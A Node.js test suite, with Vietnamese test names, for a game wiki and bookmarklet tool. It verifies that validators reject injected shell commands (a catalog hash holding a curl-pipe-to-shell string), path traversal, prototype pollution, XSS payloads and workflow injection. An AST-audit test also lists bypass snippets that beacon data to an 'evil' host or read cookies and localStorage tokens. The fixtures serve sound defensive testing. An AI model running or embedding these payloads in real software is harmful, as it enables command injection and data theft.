import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateCatalog, containedPath } from '../lib/validate.mjs';
import { extractClient } from '../lib/client.mjs';
import { parseLiteral } from '../lib/literal.mjs';
import { request, TooLarge } from '../lib/http.mjs';
import { toWebp } from '../lib/image.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../..');
const goodCatalog = () => ({
  catalog_hash: 'a'.repeat(64),
  catalog: {
    species: Array.from({ length: 12 }, (_, i) => ({ id: `unit_h${i}`, catchable: true })),
    abilities: [{}], modifiers: [{}], display_names: [{}], research: [{ id: 'research_r000' }],
  },
});

test('catalog: hash chứa lệnh shell / id chứa đường dẫn bị từ chối', () => {
  assert.deepEqual(validateCatalog(goodCatalog()), []);
  const evilHash = goodCatalog(); evilHash.catalog_hash = '"; curl evil.sh | sh #';
  assert.ok(validateCatalog(evilHash).includes('catalog_hash'));
  const evilId = goodCatalog(); evilId.catalog.species[0].id = '../../.github/workflows/x';
  assert.ok(validateCatalog(evilId).length);
  const evilResearch = goodCatalog(); evilResearch.catalog.research[0].id = '..%2f..';
  assert.ok(validateCatalog(evilResearch).length);
});

test('đường dẫn ảnh không thoát được khỏi public/<dir>/', () => {
  const pub = join(ROOT, 'public'), dirs = [join(pub, 'portraits')];
  assert.ok(containedPath(pub, dirs, 'portraits/pet_a.webp').endsWith('pet_a.webp'));
  for (const k of ['portraits/../../package.json', '../scripts/x.webp', '/etc/passwd', 'portraits', 'research/x.webp']) {
    assert.throws(() => containedPath(pub, dirs, k), k);
  }
});

test('bundle: tên model / màu bẩn bị lọc', () => {
  const c = extractClient('v={unit_h001:`../../x`,unit_h002:`ok_m`,unit_h003:`a b`},m={normal:[[1,2,3],[4,5,6],[7,8,9]],fire:[["red);background:url(//evil)",2,3],[4,5,6],[7,8,999]]}');
  assert.deepEqual(c.unitModel, { unit_h002: 'ok_m' });
  assert.deepEqual(c.elementColors.fire, [[0, 2, 3], [4, 5, 6], [7, 8, 255]]);
});

test('parser literal: __proto__ không đổi được prototype', () => {
  const { value } = parseLiteral('{__proto__:{polluted:1},constructor:{x:1},a:1}');
  assert.equal(Object.getPrototypeOf(value), Object.prototype);
  assert.equal(value.a, 1);
  assert.equal({}.polluted, undefined);
});

test('http: server trả dữ liệu khổng lồ bị cắt, không tràn RAM', async () => {
  const big = `data:application/octet-stream;base64,${Buffer.alloc(64 * 1024).toString('base64')}`;
  await assert.rejects(request(big, { maxBytes: 1024, retries: 0 }), TooLarge);
  assert.equal((await request(big, { maxBytes: 128 * 1024, retries: 0 })).body.length, 64 * 1024);
});

test('ảnh: chỉ nhận PNG thật', async () => {
  assert.throws(() => toWebp(Buffer.from('<svg onload=alert(1)>')), /PNG/);
  assert.throws(() => toWebp(Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0])), /PNG/);
  const png = readFileSync(join(ROOT, 'public/favicon.png'));
  assert.ok((await toWebp(png)).subarray(8, 12).toString() === 'WEBP');
});

test('workflow: không chèn output/dữ liệu vào shell, action ghim SHA, quyền tối thiểu', () => {
  const yml = readFileSync(join(ROOT, '.github/workflows/site.yml'), 'utf8');
  const runs = [...yml.matchAll(/run: \|?\n?([\s\S]*?)(?=\n\s*- |\n\s*\w+:\n|$)/g)].map(m => m[1]);
  for (const r of runs) assert.doesNotMatch(r, /\$\{\{\s*(steps|needs|inputs|github\.event)\./, `run: có \${{ }} nguy hiểm:\n${r}`);
  for (const [, ref] of yml.matchAll(/uses:\s*(\S+)/g)) assert.match(ref, /@[0-9a-f]{40}$/, `action chưa ghim SHA: ${ref}`);
  assert.match(yml, /^permissions: \{\}$/m);
  assert.match(yml, /npm ci --ignore-scripts/);
});

test('wiki build có CSP, không script inline', () => {
  const cfg = readFileSync(join(ROOT, 'vite.config.js'), 'utf8');
  const scriptSrc = cfg.match(/"script-src[^"]*"/)?.[0] ?? '';
  assert.equal(scriptSrc, `"script-src 'self'"`);
  for (const f of ['index.html', 'src/main.js', 'src/ui.js']) assert.doesNotMatch(readFileSync(join(ROOT, f), 'utf8'), /\son[a-z]+="/, f);
});

import { auditSource } from '../build-tool.mjs';

test('bookmarklet: bộ kiểm tra AST chặn các kiểu lách danh sách cho phép', () => {
  const base = readFileSync(join(ROOT, 'tool/game-bridge.js'), 'utf8');
  const overlay = readFileSync(join(ROOT, 'tool/overlay.js'), 'utf8');
  const logic = readFileSync(join(ROOT, 'tool/logic.js'), 'utf8');
  const clean = [['game-bridge.js', base], ['overlay.js', overlay], ['logic.js', logic]];
  assert.deepEqual(auditSource(clean), [], 'code hiện tại phải qua kiểm tra');
  const attacks = {
    'ngoặc vuông': "export const x = g => g.session['sell' + 'Creature'](1);",
    'gán biến': 'export const x = g => { const s = g.session; s.sellCreature(1); };',
    'destructuring': 'export const x = g => { const { session } = g; return session; };',
    'hàm ngoài danh sách': 'export const x = g => g.session.sellCreature(1);',
    '.call': 'export const x = (f, g) => f.call(g);',
    'socket send': 'export const x = ws => ws.send("x");',
    'sendBeacon': 'export const x = () => navigator.sendBeacon("https://evil", "x");',
    'eval': 'export const x = s => eval(s);',
    'Function': 'export const x = s => new Function(s);',
    'Reflect': 'export const x = (g) => Reflect.get(g, "session");',
    'MouseEvent': 'export const x = el => new MouseEvent("click");',
    'localStorage': 'export const x = () => localStorage.getItem("token");',
    'cookie': 'export const x = () => document.cookie;',
    'innerHTML': 'export const x = el => { el.innerHTML = "<img onerror=alert(1)>"; };',
    'dispatch': 'export const x = g => g.store.dispatch({ type: "sell" });',
    'WebSocket.prototype': 'export const x = () => WebSocket.prototype.send;',
  };
  for (const [name, snippet] of Object.entries(attacks)) {
    const files = [...clean.filter(([f]) => f !== 'logic.js'), ['logic.js', `${logic}\n${snippet}`]];
    const bridgeFiles = [['game-bridge.js', `${base}\n${snippet}`], ...clean.filter(([f]) => f !== 'game-bridge.js')];
    assert.ok(auditSource(files).length > 0 && auditSource(bridgeFiles).length > 0, `không chặn được: ${name}`);
  }
  assert.ok(auditSource([['overlay.js', overlay.replace("getJSON('/catalog'", "getJSON('https://evil/'")], ['game-bridge.js', base], ['logic.js', logic]]).length > 0);
  assert.ok(auditSource([['overlay.js', overlay.replace("right: ['KeyD', 'd']", "right: ['Enter', 'Enter']")], ['game-bridge.js', base], ['logic.js', logic]]).length > 0);
});

test('bookmarklet: bản web — chỉ bấm nút chính của game, móc hàm chỉ trong game-bridge, không tạo sự kiện chuột', () => {
  const read = f => readFileSync(join(ROOT, 'tool', f), 'utf8');
  const files = ['game-bridge.js', 'overlay.js', 'logic.js', 'realm.js', 'web-input.js'].map(f => [f, read(f)]);
  assert.deepEqual(auditSource(files), [], 'code hiện tại phải qua kiểm tra');
  const withFile = (name, code) => auditSource([...files.filter(([f]) => f !== name), [name, code]]);
  const webIn = read('web-input.js'), overlay = read('overlay.js'), bridge = read('game-bridge.js');
  const attacks = {
    'bấm nút khác của game': () => withFile('web-input.js', webIn.replace('data-node="Primary"', 'data-node="Release"')),
    '.click() vào phần tử khác': () => withFile('web-input.js', `${webIn}\nexport const z = el => el.click();`),
    '.click() ngoài web-input': () => withFile('overlay.js', `${overlay}\nconst z = primary => primary.click();`),
    'tạo PointerEvent': () => withFile('web-input.js', `${webIn}\nexport const z = () => new PointerEvent('pointerdown');`),
    'đọc localStorage': () => withFile('web-input.js', `${webIn}\nexport const z = () => localStorage.getItem('x');`),
    'phím ngoài W/A/S/D': () => withFile('overlay.js', overlay.replace("right: ['KeyD', 'd']", "right: ['KeyM', 'm']")),
    'dispatchEvent ngoài phím camera': () => withFile('web-input.js', `${webIn}\nexport const z = target => target.dispatchEvent(1);`),
    'bẫy khoá khác trên Object.prototype': () => withFile('game-bridge.js', bridge.replace('_selectedEntityId: o =>', 'toJSON: o =>')),
    'Object.prototype ngoài game-bridge': () => withFile('overlay.js', `${overlay}\nObject.prototype.x = 1;`),
  };
  for (const [name, run] of Object.entries(attacks)) assert.ok(run().length > 0, `không chặn được: ${name}`);
});

import { missingSignatures, unknownShapes } from '../check-clients.mjs';

test('canary: nhận ra khi game đổi tên hàm tool dựa vào, và dạng kỹ năng lạ', () => {
  const web = 'e.onmessage=e=>{let t=sL(typeof e.data==`string`?e.data:``) this.nextSequence=1,this._selectedEntityId=null catchWild(e){return this.dispatch( evolveCreature(e,t){ tradePet(e,t){return this.dispatch( selectEntity(e,t){e.entities.has(t) {Unit:`u`,Creep:`c`,Wild:`w`,TradeOffer:`t` this.el.dataset.node=t.name `Primary`';
  assert.deepEqual(missingSignatures('web', web), []);
  assert.deepEqual(missingSignatures('web', web.replace('this.nextSequence=1', 'this.seq=1')), ['session.nextSequence (móc hàm game)']);
  const shapes = unknownShapes({ abilities: [{ id: 'x', status: 'executable', trigger: { kind: 'on_moon' }, effects: [{ kind: 'damage', magnitude: { basis: 'attack_damage' } }] }] });
  assert.deepEqual(shapes, ['trigger "on_moon" (vd x)']);
});
